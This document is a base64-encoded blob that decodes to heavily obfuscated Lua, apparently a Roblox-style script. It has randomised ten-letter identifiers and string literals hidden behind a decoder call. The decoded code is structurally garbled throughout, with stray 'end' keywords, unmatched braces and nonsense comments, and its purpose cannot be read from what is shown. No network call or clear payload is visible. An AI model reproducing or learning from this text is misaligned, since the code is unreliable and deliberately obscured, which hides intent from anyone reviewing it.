AgIHZHTGxCeldnQ2ogPSBjWFNEVXF3d2xELm5tZUF0dHlLUmYsCmxvY2FsIGlMbkd4ZGRoQWogPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChrQmRhRU9hZHNCKVsiemFQYmhUaGJSbiJdKCJycVNqellZSE5HPT0iKSkpCiAgICBsYXdrV0FWVWhaID0gKChyWEtNd0thdUpXKVsiemFQYmhUaGJSbiJdKCJNQkJ1dFlXUmlqPT0iKSksCi0tIHFLd1VhaVZqc0kgSkphcVhySWdHViBUVUh0ZElNVXdNIFV4QlNqWW1VcmwKICAgICAgICAgICAgRkdOS2ZaRlJDaSA9IFRMSFdxVG55Rkoua0VlYU1OcldGWChGR05LZlpGUkNpLCAxLCAxMCkgLS0gVEpkR1NuVmhqSiBSam9CQlRNQVVVIGlZZHVvUExBT1ogMSAtIDEwIHV2Qm1rRG1saUMKCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBmdW5jdGlvbih0SGVvdmhKa1JBKQpDVUxrTGdUbGNBLmlkSEhwd1BkRWcgPSBRbkVGanl1QnV5LnhoVG9namVpZmgoMCwgOCkgCiAgICAgICAgZW5kCmVuZAogICAgICAgICAgICAgICAgdkxCTWNrenZiViA9IGZhbHNlCiAgICBpZiBlZ01NU1ZETGZzIHRoZW4KICAgICAgICBlbmQKICAgICAgICBIR0lyUXZ6T3l1LlB4b3hnUWVOY1YuREluZ2pLTW9YVjpad29vU2lqVUhLKCgoZ0FBb0tkenhiTylbInphUGJoVGhiUm4iXSgidXZOaWJsamdQdyIpKSkKbG9jYWwgWHJvZFRVYXJPaiA9IHt9Ci0tIGNOd1lKdVdVQWIgbXlhZ0FYSXNtdCBEZGdTQVFVVlpNIG9Ua0tpUW1mR2wKICAgICAgICAgICAgICAgIGxvY2FsIExmdnJMSHVGaFUsIHJkeU5xb3lEVnYgPQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKCkKCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgTXFZb3hEb3NKRyA9ICgoSUxxWkZYVE5XRSlbInphUGJoVGhiUm4iXSgickRkcXZibFpycj09IikpLAoKbG9jYWwgWFVCQm5rQUV6dyA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKFZzaFNlRE1Xd3ApWyJ6YVBiaFRoYlJuIl0oImpVYVdKU3FuUUIiKSkpCmxvY2FsIEVTaFhIUnFIcEogPSBRbkxYaVZWT1VqLllGcWxlUVlvbnY6ZklXREFPcEJ4RigoKExYWlhzTHRTeFopWyJ6YVBiaFRoYlJuIl0oIkVVaGVSc3pudlEiKSkpCiAgICAgICAgICAgIERLZktSWGpXUmU6U2NTRGlEdU9acygoKFFsTVhDcExXeHEpWyJ6YVBiaFRoYlJuIl0oImFiSllsbERNTko9IikpKTprbEt6QWVrYkpYKApsb2NhbCBwWkFDTW94YUtEID0gKChhSU5XcVlRR3BIKVsiemFQYmhUaGJSbiJdKCJZc29ZSUpaUEVUPSIpKQogICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgSVdESlBDZGd2Ry5QUVVFaVJCc3dqOk93SkRZVFd3UWIoKQogICAgICAgIGdEWnFoVG1wcWcKICAgIGlmIGR5bE1LeGdlTEogSmRsbGRmRnl3WCBxc2xHQnNIR0JWIHN4RkhSVEtrSW0gdGhlbgplbmQKICAgIFFuTFhpVlZPVWoucUt3VWFpVmpzSTpWSUhjWVpTUnZCKApsb2NhbCBmdW5jdGlvbiBnbEl6eVFNYkRoKHp2QnhOdnJWc1YpCi0tIGVueFNMY3lUSHQgY053WUp1V1VBYiBteWFnQVhJc210IG9Ua0tpUW1mR2wKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJiUHZ2RVNqc0kgdGhlbgogICAgICAgICAgICAtLSBPakdpTWtlWUVGIGJGenBnUFNnVUQgVkZRWGtuelZyZiBmdW5jdGlvbiBSV1NRbWtxWFV0IE5aemRKVUFaeVoKICAgICAgICBBWFhCSnlWT1NiID0gUk1XV0tmV21Nei5IZ0lWVWlRbEpILndTUU9pUGNIa0kKb1RrS2lRbWZHbDpvcFdweE5KeFFqKAogICAgICAgICAgICBsb2NhbCBtS1JMSWNCUnBNID0gVnBtaU5GWGFnTy54aFRvZ2plaWZoKC05MzEuNTI1LCAyMjMuNzg0LCAtOTg2Ljg0OSkKbG9jYWwgQnVkaGVLakVldyA9IFFuTFhpVlZPVWouTUl5RkN5V3lKTzppdlVySlh3a25aKCgodmhkaXVPcmFFVClbInphUGJoVGhiUm4iXSgidGRBQ1Bzanl0eT0iKSksIHsKICAgICAgICAgICAgICAgICgoc3BNS2hYcndBcylbInphUGJoVGhiUm4iXSgiTk9velNJak5EVD0iKSkKICAgICAgICB2R0xsQnpXZ0NqID0gNTAsCiAgICAgICAgbGF3a1dBVlVoWiA9ICgoV1FpYnlEWkJTdClbInphUGJoVGhiUm4iXSgienRob1RjUUFlcz0iKSksCgoKc3NiRkFLbW1JQy5XSGpvdEtFdEF1ID0gMC4yCiAgICAgICAgICAgIAogICAgewpsb2NhbCB1ZnhSeXNEYmxrID0gaG5RVlFVRW5JeShES2ZLUlhqV1JlOklVcnZDTWJMTFMoKChoc3RrWE5SWXhDKVsiemFQYmhUaGJSbiJdKCJxTnJzcllDd3hZPSIpKSkpKCkKClFuTFhpVlZPVWouWkVOT2pCcWZqSDppdlVySlh3a25aKAopCiAgICBOUVpVSFBXRE1vID0gZnVuY3Rpb24oS09wR0ZsS1dEcikKCiAgICB9CiAgICAgICAgcXFMYVVNZW5pcCA9IHsoKFFTTEhlS0p6VU0pWyJ6YVBiaFRoYlJuIl0oIlh6ZWdmZ3NrRUk9PSIpKSwgKChFZGxyTUdEQnd5KVsiemFQYmhUaGJSbiJdKCJTUkJsR1ZrYkFRIikpfSwKCgogICAgICAgICAgICBpZiBtZlN2VnZFWHBLIHRoZW4KICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAtLSBLSm9qcURQZmJxIG1VU3hlVmtuRkggTXdRQ0NMSVVBWSBJb2JTZWppTkdSIERtdnRMTExMSnIgTnRmekxQRU1kSSAoS3FIU1VxUG1tcCkgb3J6R1hjcExzZCBRVW1GZnpFdGRtCiAgICAgICAgICAgIG5vQUVFVmV6Y2VbQ2NYRGVReHZ4c10gPSBabGxta2JmSG1xW0NjWERlUXh2eHNdCiAgICAgICAgbG9jYWwgSE9ycHFWWkhIaCA9IHt9CgogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTHhqdkp1eVRkVzpMdEJpZ3lTSVpXKCkKbG9jYWwgQllvVm1VSWtEYSA9CiAgICAgICAgLS0gR2V1d3ZYVHdNTiBKd0ZXRUtqd2dEIGluQXl4Z3NRYkwgd1BkdnFidFNsUQogICAgICAgICAgICAgICAgICAgICAgICBtT3RXRlBOSmpTID0gbVZiam1meWRWbS54aFRvZ2plaWZoKGp3UXh4Slhob20uaElDckFaVXFsZCArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA3NiwgMCkpCiAgICBmdW5jdGlvbigpCgogICAgICAgICAgICAgICAgICAgIGVuZApYWlRTUEJ6VVZPIE1wS2FtVkdtWGosIEFOT1hJT1hRVnYgbXRwZENFY0VEaiB5aHpUVWNDWWZPKFFJaXFUWFRlbm46RWF0T2lmWExaVSgpKSBwWWlpV1pHVUJyCiAgICAgICAgICAgIGxvY2FsIGRhVGRTdG9nUFAgPSBORFlpRGZ2RndwLndTUU9pUGNIa0kKICAgICAgICAgICAgZW5kCiAgICAgICAgdnJOaERYcFNhciA9IHRydWUKICAgIGVuZAogICAgICAgICAgICAgICAgRG1zTm5uekRuRSA9IGZhbHNlCiAgICAgICAgfQotLSBXSUVFd0xkeVJ2IFpkQmVGallwWnggY3RjZlJya2NRayBjTndZSnVXVUFiCikKKQogICAgICAgIGdEWnFoVG1wcWcKICAgICAgICAgICAgICAgIFhaVFNQQnpVVk8gcFJ6cUxiVExqSSA9IDEsIDUgcFlpaVdaR1VCcgoKICAgICAgICAgICAgYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKGZVUFV0RU9KTUopCiAgICAgICAgICAgICAgICBlbmQKRVNoWEhScUhwSjpWcGNPbkt1V0pPKAogICAgICAgICAgICAgICAgICAgICAgICB5SllHZFZqemVHLlNUQmJIQmdmS0soYXRQcFpvekpaZywgMSwgWFVEbmVUeWNzaykKICAgICAgICBlbmQKICAgICAgICBXWklLZlhEbWdKID0gKChyeGJkVVhFUkhWKVsiemFQYmhUaGJSbiJdKCJXSU1DY2ZpRU5RPSIpKQoKICAgICAgICBsYXdrV0FWVWhaID0gKChmaFZ1bFhNb0J0KVsiemFQYmhUaGJSbiJdKCJremp2Z3BlZENCPT0iKSksIC0tIHJXWXhRUmlsa20gXEVEWWtGYXdnS3cga0hLWVZFRUZJYiBIZmJJZ3p0VFNqIFF6RmR0Z2NjV00KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNKaWluZmdTclYuaElDckFaVXFsZCA9CiAgICAgICAgICAgICAgICBpb0JBa0dXVGRLOkF2R1p4emRlbHUoc05vZWh1TWRhUyAuLiAoKE1RcUdPT2JsRmQpWyJ6YVBiaFRoYlJuIl0oIlpWbHNpamprTEQ9IikpIC4uIHZBam5Ra05OY2spIC0tIFdJRUV3TGR5UnYgXEVEWWtGYXdnS3cga0hLWVZFRUZJYiBIZmJJZ3p0VFNqIFF6RmR0Z2NjV00KCiAgICAgICAgICAgIFhaVFNQQnpVVk8gcFJ6cUxiVExqSSA9IDEsIEdwWFdzRHNqUGQgcFlpaVdaR1VCcgoKCiAgICBsYXdrV0FWVWhaID0gKChBSFV2RHpOWU5DKVsiemFQYmhUaGJSbiJdKCJWU1hqTXdLZkZXPSIpKSwKICAgIGlmIHFzbEdCc0hHQlYgV3FCV1V2anJIUyB0aGVuIHJldHVybiBlbmQKKQogICAgICAgIHFxTGFVTWVuaXAgPSB7KChhSU5XcVlRR3BIKVsiemFQYmhUaGJSbiJdKCJZc29ZSUpaUEVUPSIpKX0sCiAgICAgICAgICAgIGVuZAogICAgICAgIGlmIEZObUV3R256dU8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAgICAgb2pJV2Z6UmF4RihzVFBPaG1nSWFGKQpsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5aRU5PakJxZmpIOmZJV0RBT3BCeEYoKChWT1JUQndlVGd0KVsiemFQYmhUaGJSbiJdKCJuT0Vmc2FHemNiPT0iKSkpCiAgICAgICAgWFpUU1BCelVWTyBkeXF5ekZLWGVHLCB0SGVvdmhKa1JBIG10cGRDRWNFRGogeWh6VFVjQ1lmTyhKa211eXBQRWpSLlhISWJjb1huV0QpIHBZaWlXWkdVQnIKbG9jYWwgaW9CQWtHV1RkSyA9CgogICAgICAgICAgICAgICAgaWYgcENud0RlZ0tRbiB0aGVuCiAgICAgICAgICAgIGxvY2FsIFVXZnlCbFFXdWkgPSBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbAogICAgICAgICAgICAgICAgTnNqaWlzUUZOWC5PTExLdldlYU92LlhtSHJ2U3dLVUkgPSAoKE1sT01NSXNYamIpWyJ6YVBiaFRoYlJuIl0oImZmUUhPS3JQYXYiKSkKICAgICAgICAgICAgICAgICAgICBpZiBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChydU5KZGhLSnNZKVsiemFQYmhUaGJSbiJdKCJxSlFSUGxRT3F5PT0iKSkpIEpkbGxkZkZ5d1ggWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoY2tzUkFaSXN1RSlbInphUGJoVGhiUm4iXSgiZVJESU1la3dqZz0iKSkpIEpkbGxkZkZ5d1ggWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoUW9IVmVkR3dpSylbInphUGJoVGhiUm4iXSgiaVBLckNWaXd6TT0iKSkpIHRoZW4KCiAgICB7CgogICAgICAgICAgICBpZiBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKChMSWlZQWFyZ3dLKVsiemFQYmhUaGJSbiJdKCJnTUx3ZXVzenRlPSIpKSk6Wndvb1NpalVISygoKFRaUHRudnJ3VVIpWyJ6YVBiaFRoYlJuIl0oIkRFZGdQV3VxdXIiKSkpIHRoZW4KICAgICAgICBlbmQKICAgICAgICBkY1FKSlpwTWVEKAogICAgZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIEN6d3hVb2haWE8gPSBZVHF6eXhqb3pkIEx6dW9jVkRzR3IgWVRxenl4am96ZC53U1FPaVBjSGtJIEpkbGxkZkZ5d1ggbmlsCmxvY2FsIENaeE11eUl6QW8gPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh0TkdWY3haSUx1KVsiemFQYmhUaGJSbiJdKCJkUW5ock5teFh4PT0iKSkpCgogICAgZW5kCgogICAgICAgICAgICBlbmQKICAgICAgICBsb2NhbCBoVU9qdVR3T2pPID0gewotLSB2VUZFR1VWSVVHICgoeldPcEV3a0V3SSlbInphUGJoVGhiUm4iXSgiWm90aWtQVGlVSyIpKQogICAgICAgICAgICBkR2ZwVVpJREVGIGNYU0RVcXd3bEQuZ1FKYVlFTmFUQSBwWWlpV1pHVUJyCikKICAgICAgICAgICAgaWYgcXNsR0JzSEdCViBjWFNEVXF3d2xELm5tZUF0dHlLUmYgdGhlbgopCmxvY2FsIEN2YW90ZUtqaVMgIC0tIG1kVmxYeU5nUmoga0hLWVZFRUZJYiBkaVJmU3RHYXVXIHVOS05zRmZrYXIgdm1EVVpXS0hnVQoKICAgICAgICAgICAgZW5kCnBGZHpNYWxiTHcuc2pIZXBBSk1BeSA9IDEKICAgICAgICAgICAgICAgIGJKSmtLeUNXekMoUXl3ZkxBU2hGUCkKICAgICAgICAgICAgWGdvdkRoeVRiWTpCU2lEbVNLSFNzKCgoZUh6QVBFTlNxQylbInphUGJoVGhiUm4iXSgiVVllZkd6WWpCVCIpKSk6QlNpRG1TS0hTcygoKExZSWNrU01OYXcpWyJ6YVBiaFRoYlJuIl0oIkJXa1N5aHpwaVc9PSIpKSk6bU1XckZtSE90VShkeXF5ekZLWGVHKQotLSAtLSBUR0ZPVW9rVWJZIEFYSVB6enVJYkkga0hLWVZFRUZJYiBzQUxJeXFNUFpHIFdhaHZ6VWdicHogS3ZoY0Z2T3hhVAogICAgICAgIENCd0xrUkdSanQgPSAxMApwSlpxT0lxT0xkOlJZd0FiREZmaUkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKFdYdEt5Q3Nva1ApWyJ6YVBiaFRoYlJuIl0oIlhWcXhyWnZRQWY9PSIpKSBKZGxsZGZGeXdYIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKEhqZUlYREllZFQpWyJ6YVBiaFRoYlJuIl0oImp5R2NLWWt6elM9IikpIHRoZW4KICAgIHJldHVybiBOY3VGZFhqRU1kLkhGbFJiTFFMWFgoKChEZlJKb0NaQkJBKVsiemFQYmhUaGJSbiJdKCJsRm9ZVHpJWm5JPSIpKSwgUFdHY09qbm9KZSwgWlNmbnlNYW5DdCwgSnpNQnJSYURBZSkKCgogICAgICAgIGxhd2tXQVZVaFogPSAoKHNBd2VDcWlvdGMpWyJ6YVBiaFRoYlJuIl0oIkNvZWRJcnZwYnU9IikpLApsb2NhbCBzcUNNcklEalNMID0KICAgICAgICAgICAgbG9jYWwgS2xHRWlQb05PSSA9IEN2YW90ZUtqaVM6cWdhS1dLbHFWdSgpCiAgICB9CiAgICAgICAgICAgICAgICBrQ2plVVNxUmVZID0gdHJ1ZSwKICAgIGlmIGpjYlBxZ2dTYXEgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGpjYlBxZ2dTYXEgPSBIV3ZxRVZpSG1NOnZxWnFjREpxbXgoKChmWVpvcVJoWVVNKVsiemFQYmhUaGJSbiJdKCJJc1VWUmRMcVB1PT0iKSkpCgogICAgICAgICAgICBsb2NhbCBaZHNsbFhSZlpqID0gaXFsdGtYd2xPRjpad29vU2lqVUhLKCgoRWRsck1HREJ3eSlbInphUGJoVGhiUm4iXSgiU1JCbEdWa2JBUSIpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdxQldVdmpySFMubVZiam1meWRWbSA9IEJiUHZ2RVNqc0kubVZiam1meWRWbSArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA1LCAwKQogICAgaXRKbkl3Y2ZDWi5MSUJ2aWtKdmtYID0genZCeE52clZzVi5MSUJ2aWtKdmtYICsgVnBtaU5GWGFnTy54aFRvZ2plaWZoKDAuNSwgMC41LCAwLjUpIC0tIENYWnpNSVNrV3YgUnVwb1RDZnZXZiBQQnJvWkR0T0RtIElhbGpFdW1UR3kgVlhVQlRhdU5wZgp1ZnhSeXNEYmxrOnBadm93bFR3VlEob1RrS2lRbWZHbCkKbG9jYWwgQ1VMa0xnVGxjQSA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKGJ2ZnpLU3ZQb1MpWyJ6YVBiaFRoYlJuIl0oIlBpUUJZaG5HcGM9IikpKQogICAgeW1EY0F5aEZrSy54Qm1wcXJLbGxLID0gV3BxVVhmZ0pYTAoKICAgIFhaVFNQQnpVVk8gTXBLYW1WR21Yaiwgc1RQT2htZ0lhRiBtdHBkQ0VjRURqIHloelRVY0NZZk8oS2t6T2lTQmpzbC5IR0lyUXZ6T3l1OkVhdE9pZlhMWlUoKSkgcFlpaVdaR1VCcgogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgVHlPUmpTT1hydDpWSUhjWVpTUnZCKAogICAgICAgICAgICBlbmQKLS0gdVZGWXRZeWR0bzpWQ01zRHFYeGRLKCkKICAgIGxvY2FsIFlyUFBIYWZMWWYgPSBUWEhrVUZLakhVLkZlYWx3ZW5MbFEudEZwSXl2ZGFBbAogICAgICAgIE1xWW94RG9zSkcgPSAoKHVieVRsRGZLaUspWyJ6YVBiaFRoYlJuIl0oImpodHdxUElocFIiKSksCiAgICAgICAgICAgICAgICBlbmQKLS0gU3hnR1NNQ0NaTi5MSUJ2aWtKdmtYID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAsIDEsIDAuNywgMCkgLS0gc25YY3lJb0tKVSBFQXFSaVpBWUxlIHR6S0tOV1p6cHIKCgogICAgICAgICAgICAgICAgICAgIC0tIE9qR2lNa2VZRUYgVkZRWGtuelZyZiBrSEtZVkVFRkliIGRKSndtdlZSeFUgQURDblNHbnJ0USBSam9CQlRNQVVVIGdyaWd5dnlBV0cKICAgICAgICAgICAgZW5kCgotLSBrSUZ4aUV1V0VBIG54RWpSU0lKT24ga0hLWVZFRUZJYiBOSWt3cVhtenBOJCBJYWxqRXVtVEd5IFFVbUZmekV0ZG0KICAgICAgICBabHdhclJvbmlWKCgodWt1bEFTcGt5bClbInphUGJoVGhiUm4iXSgibmdiSVJwQVlQeD0iKSksIGVnTU1TVkRMZnMpCn0pCiAgICBmdW5jdGlvbihMd1ZXc2pyRXZnKQogICAgICAgIHFxTGFVTWVuaXAgPSB7KChRU0xIZUtKelVNKVsiemFQYmhUaGJSbiJdKCJYemVnZmdza0VJPT0iKSksICgoanBBc0xJTGJ0cilbInphUGJoVGhiUm4iXSgib2xmcE1hdmV2az09IikpfSwKWFVCQm5rQUV6dy5YbUhydlN3S1VJID0gKChDUHJpZmR6blVSKVsiemFQYmhUaGJSbiJdKCJqQW9FQ0dCRXFCPT0iKSkgLS0gS2VZSkN1bHJucyBhY0hpa1RrY3laIHdZVWtHd2xUSnMgdXVsSHFOVll3RgogICAgICAgIH0KICAgIGl0Sm5Jd2NmQ1ouR3d1cVd3eUF4SSA9IDAuMwoKICAgICAgICAgICAgICAgIHJXZE16S3FGVGooKQogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGlmIEdDQlpIT3BwTXkgdGhlbgogICAgewogICAgICAgICAgICBsb2NhbCBVV2Z5QmxRV3VpID0gREtmS1JYaldSZTpTY1NEaUR1T1pzKCgoa0JkYUVPYWRzQilbInphUGJoVGhiUm4iXSgicnFTanpZWUhORz09IikpKS5La3pPaVNCanNsCiAgICBlbmQKICAgICAgICAgICAgaWYgQU5PWElPWFFWdjp2VXlWWlRQaERlKHRIZW92aEprUkEsIDEsIHRydWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgWFVEbmVUeWNzay5YWEVxckZJRlZ5ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMSkKICAgIGh4Z0lVeUNVc08gPSBmYWxzZSwKICAgICAgICAtLSBXTFZIRUlZeExaIGFjSGlrVGtjeVogUVh3d1RiT0tZaCBuc0dWSlFCcElyCiAgICByZXR1cm4gTEx5VlN6TmhCYjpiSlpBc1J0WGt6KCkgPCBCYkh1VGFVYVJyOmJKWkFzUnRYa3ooKQogICAgICAgICAgICAgICAgOWU5CiAgICAgICAgICAgICAgICBlbmQKICAgIH0KZW5kCmxvY2FsIFBRVUVpUkJzd2ogPSBJV0RKUENkZ3ZHLlBRVUVpUkJzd2oKICAgICAgICB2R0xsQnpXZ0NqID0gKChrSG1qYW50U01wKVsiemFQYmhUaGJSbiJdKCJ5SVRDQnBpWFdRPT0iKSksCiAgICAgICAgeEhsZXlDU0NBeTptRkZCc3JDdERJKFdqWXJaa2hLVk0uWUhobVFEREJuQy5JTlhnTEdLSlFlLCB0cnVlKQogICAgICAgIE1xWW94RG9zSkcgPSAoKGpRcW52bkNLQm0pWyJ6YVBiaFRoYlJuIl0oInZMT1lKckpHVmEiKSksCiAgICBJQ0d2RXZrbEl6LmhJQ3JBWlVxbGQgPSBRWENjZm92bFdHIC0gVnBtaU5GWGFnTy54aFRvZ2plaWZoKDAsIDMsIDApIApRbkxYaVZWT1VqLllGcWxlUVlvbnY6VnBjT25LdVdKTyh7CiAgICBoaVNUakhWTU1lLnhoVG9namVpZmgoMSwgV2pZclpraEtWTS5YSWVic3l5TWZWLmVWWXVCZlFXWnMsIFdqWXJaa2hLVk0uaVF1R0VobkFFZy5SZ3hiS3JnamVaKSwKICAgICAgICBNcVlveERvc0pHID0gKChjTmZYUWNrVm9PKVsiemFQYmhUaGJSbiJdKCJxSEl6TWFBY2JpPT0iKSksCiAgICAgICAgbG9jYWwgZGFUZFN0b2dQUCA9IE5EWWlEZnZGd3Aud1NRT2lQY0hrSQogICAgaXRKbkl3Y2ZDWi5zQ0NUbWJUQkZWID0gNQogICAgewogICAgZEdmcFVaSURFRiB6eVpNVm5RR3VGIHBZaWlXWkdVQnIKICAgICAgICBhblRuekFvQ2l6ID0gdHJ1ZSwgLS0gUkRnT1p3b01jYiBhTEpVeEZsU3NZIERtdnRMTExMSnIgbmFlaVNUbmNPaAogICAgICAgIGVuZAotLSBjYnpGeGJmWE5yIEpDWXNQUmRHdmcgZGdwSmFzbWV5UyBicFlpbVFqd0ZVIHJMS0hIa3lEZWUgVVdmeUJsUVd1aQogICAgTXFZb3hEb3NKRyA9ICgodkFiU3RselBUVylbInphUGJoVGhiUm4iXSgiRnFwZEpBbm1jUz0iKSksCiAgICBsYXdrV0FWVWhaID0gKChoellzWk9BS2t6KVsiemFQYmhUaGJSbiJdKCJwRVRrQWthb1hOPT0iKSksCgogICAgbG9jYWwgaXRKbkl3Y2ZDWiA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKE1wS3RBY0FjS2wpWyJ6YVBiaFRoYlJuIl0oImRYT3lHakxQTngiKSkpCiAgICBmdW5jdGlvbigpCmxvY2FsIHBKWnFPSXFPTGQgPQpUb2VOSUpqYlNFOlJZd0FiREZmaUkoCiAgICAgICAgTXFZb3hEb3NKRyA9ICgoZmRoZkxocHRHTilbInphUGJoVGhiUm4iXSgiVXppeHZPd3RuQT09IikpLAoKLS0gdkdMbEJ6V2dDaiBxY1Jia0hTaVdiIFhMbkZUYWtMaEYKICAgICAgICBsYXdrV0FWVWhaID0gKChtRFJCdk1taW9CKVsiemFQYmhUaGJSbiJdKCJ4VVJnTm5RaXFlPT0iKSksCiAgICAgICAgICAgIFpsd2FyUm9uaVYoKChMZEZUUWNGdW9zKVsiemFQYmhUaGJSbiJdKCJSbllzZXJMTXJiPT0iKSkpCiAgICAgICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygwKQogICAgUW5MWGlWVk9Vai5aelRBaVhnZG9uOmVNSUJrc0xvRFIoClFuTFhpVlZPVWouWUZxbGVRWW9udjpWcGNPbkt1V0pPKAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICBpZiBxc2xHQnNIR0JWIEhXdnFFVmlIbU0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGVpRkFudkVXVUMgPSBjeVlVd1FaTHl5LldxQldVdmpySFMuaElDckFaVXFsZAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBoSUNyQVpVcWxkID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAuNSwgMCwgMC43MCwgMCkgLS0gZnFrWVNzd2padiBSdXBvVENmdldmIFBBVmdNeVJvakQgckZJQmNvcmRYQiBzc2JGQUttbUlDCiAgICB2R0xsQnpXZ0NqID0gbmlsCi0tIEhVZlVEVUlWcnIudW9OZ3BxZFlCaiA9IDkwIC0tIEhVZlVEVUlWcnIgSWFsakV1bVRHeSBFY2tNWGJzYmdoIGN0Y2ZScmtjUWsgalBlZWJzYldrTQogICAgICAgICAgICAgICAgICAgIHJDbnhHdGxDWFE6cHdZSGtSUXlIZihmYWxzZSwgV2pZclpraEtWTS5DdVBrQm53aml5Lm9oVVJLTWpyRWcsIGZhbHNlLCBES2ZLUlhqV1JlKQotLSBrSUZ4aUV1V0VBIFN3S1pvcFNMU04gVVdDUXFIQmxaeSBJYWxqRXVtVEd5IFhnb3ZEaHlUYlkKICAgIHsKbG9jYWwgU3hnR1NNQ0NaTiA9IFNVeVhXd1hGSXQueGhUb2dqZWlmaCgoKHR3RWpOblpoaXgpWyJ6YVBiaFRoYlJuIl0oImZESkNPcHVDbmw9IikpKSAtLSBzblhjeUlvS0pVIFlPQkliWVl3ZHEKICAgICAgICBjR1NxSGxIUnltID0gdEhlb3ZoSmtSQQogICAgICAgIGZ1bmN0aW9uKHdTUU9pUGNIa0kpCgoKICAgICAgICAgICAgICAgICAgICBndmhlamZOdkRoIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9PSAoKHhLdGRlVGlTakMpWyJ6YVBiaFRoYlJuIl0oInpvUWZlYktFaEU9PSIpKSBMenVvY1ZEc0dyIEp4ckh5WURjWE4gdGhlbgogICAgfQpsb2NhbCBzRnd4VWhyRW1ZID0gV3BxVVhmZ0pYTDpad29vU2lqVUhLKCgocmtRdFVxZmZMUSlbInphUGJoVGhiUm4iXSgiZmloRWRjSXBJTj0iKSkpOkJTaURtU0tIU3MoKChGcUZ1R1NxSWZRKVsiemFQYmhUaGJSbiJdKCJORkxVanhFZE5GPT0iKSkpCiAgICAgICAgICAgIEZTdHpsRHZuTkMoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCBKeHJIeVlEY1hOCiAgICAgICAgICAgICAgICAtLSB2Tmt3d2FZSmRqIE1WRmJrU1FvSlAgUmFZR2lFelhwSSBvVmVmVUZnaEd3IFZuRWd1dWx4UVgKbG9jYWwgTGxtaVpjZU53SCA9IFFuTFhpVlZPVWouREdWbmtOaWtoUzppdlVySlh3a25aKCgoZENjVE12a1B4USlbInphUGJoVGhiUm4iXSgiaVFmZkxueHR0cz09IikpLCB7bGF3a1dBVlVoWiA9ICgoa1RmYnlUendVTilbInphUGJoVGhiUm4iXSgiQ05MTGpMd0ZIZCIpKSwgdkdMbEJ6V2dDaiA9IHRydWV9KQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHZjQWhXRnVBTUk6THRCaWd5U0laVygpCiAgICAgICAgICAgIGVuZAotLSBSZ01QUWh3Q01lLlhEWXFrV0VHWXIgPSBXallyWmtoS1ZNLlhEWXFrV0VHWXIuQ3RKcXNUZ3F5cwpRbkxYaVZWT1VqLlp6VEFpWGdkb246aXZVckpYd2tuWigoKGVZc1N2eGlhdE0pWyJ6YVBiaFRoYlJuIl0oImhsUENlSG95b1UiKSksIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIGtJRnhpRXVXRUEgVXlIc05pQVpVRyBGR05LZlpGUkNpIElhbGpFdW1UR3kgaENhbEVyRGZGRCBjTndZSnVXVUFiCi0tIFJZcGxMamdHc0MgdWVpS0ZyQWxNYwoKICAgIGxvY2FsIEZObUV3R256dU8gPSBWUG1Ra2JIWGxwLkhHSXJRdnpPeXU6Wndvb1NpalVISygoKFJvS0pyanp4cHUpWyJ6YVBiaFRoYlJuIl0oIkJmV2dwclJRblA9PSIpKSkKICAgICAgICB2R0xsQnpXZ0NqID0gKChobE5uak5odWxHKVsiemFQYmhUaGJSbiJdKCJwR0d0Y1pITUNqPT0iKSksCiAgICAgICAgZEdmcFVaSURFRiBjWFNEVXF3d2xELm5tZUF0dHlLUmYgcFlpaVdaR1VCcgpDVUxrTGdUbGNBLnhCbXBxcktsbEsgPSBwRmR6TWFsYkx3CiAgI